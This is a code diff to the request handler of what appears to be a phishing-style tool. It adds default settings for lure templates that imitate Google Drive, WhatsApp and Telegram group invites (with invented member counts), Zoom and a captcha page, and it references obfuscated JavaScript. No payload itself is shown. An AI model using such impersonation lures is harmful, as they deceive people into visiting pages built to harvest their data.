@@ -127,6 +127,41 @@ class SeekerHandler(SimpleHTTPRequestHandler):
         if self.session_manager:
             self.session_manager.update_error(client_ip, error)
 
+    # Default env vars for templates that need interactive input
+    _template_defaults = {
+        'gdrive': {
+            'REDIRECT': 'https://drive.google.com/file/d/example/view',
+        },
+        'whatsapp': {
+            'TITLE': 'Private Group',
+            'IMAGE': 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
+        },
+        'whatsapp_redirect': {
+            'TITLE': 'WhatsApp Group',
+            'IMAGE': 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
+            'REDIRECT': 'https://chat.whatsapp.com/example',
+        },
+        'telegram': {
+            'TITLE': 'Telegram Group',
+            'IMAGE': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg',
+            'DESC': 'Welcome to our group',
+            'MEM_NUM': '1,258',
+            'ONLINE_NUM': '342',
+        },
+        'zoom': {},
+        'captcha': {
+            'REDIRECT': 'https://www.google.com/',
+            'DISPLAY_URL': 'https://www.google.com/',
+        },
+        'custom_og_tags': {
+            'REDIRECT': 'https://example.com',
+            'SITENAME': 'Example',
+            'TITLE': 'Example Page',
+            'IMAGE': 'https://via.placeholder.com/1200x630',
+            'DESC': 'Example description',
+        },
+    }
+
     def _handle_template_switch(self, data):
         """Handle template switching from dashboard."""
         import shutil
@@ -156,13 +191,38 @@ class SeekerHandler(SimpleHTTPRequestHandler):
                 self._send_json({'status': 'error', 'error': f'Template directory not found: {dir_name}'}, 400)
                 return
 
-            # Re-import the template module to regenerate index.html
+            # Set default env vars so modules don't block on input()
+            # Save and restore to avoid leaking between switches
+            defaults = self._template_defaults.get(dir_name, {})
+            saved_env = {}
+            all_keys = set(defaults.keys()) | {'REDIRECT', 'TITLE', 'DESC', 'IMAGE',
+                'SITENAME', 'MEM_NUM', 'ONLINE_NUM', 'DISPLAY_URL'}
+            for key in all_keys:
+                saved_env[key] = os.environ.get(key)
+                if key in defaults:
+                    os.environ[key] = defaults[key]
+                elif key in os.environ:
+                    del os.environ[key]
+            os.environ['DEBUG_HTTP'] = '1'
+
+            # Module imports use relative paths — must chdir to project root
             import importlib
             import sys
-            module_name = f'template.{import_file}'
-            if module_name in sys.modules:
-                del sys.modules[module_name]
-            importlib.import_module(module_name)
+            old_cwd = os.getcwd()
+            try:
+                os.chdir(base_dir)
+                module_name = f'template.{import_file}'
+                if module_name in sys.modules:
+                    del sys.modules[module_name]
+                importlib.import_module(module_name)
+            finally:
+                os.chdir(old_cwd)
+                # Restore env vars
+                for key, val in saved_env.items():
+                    if val is None:
+                        os.environ.pop(key, None)
+                    else:
+                        os.environ[key] = val
 
             # Copy obfuscated JS
             js_dir = os.path.join(tpl_dir, 'js')
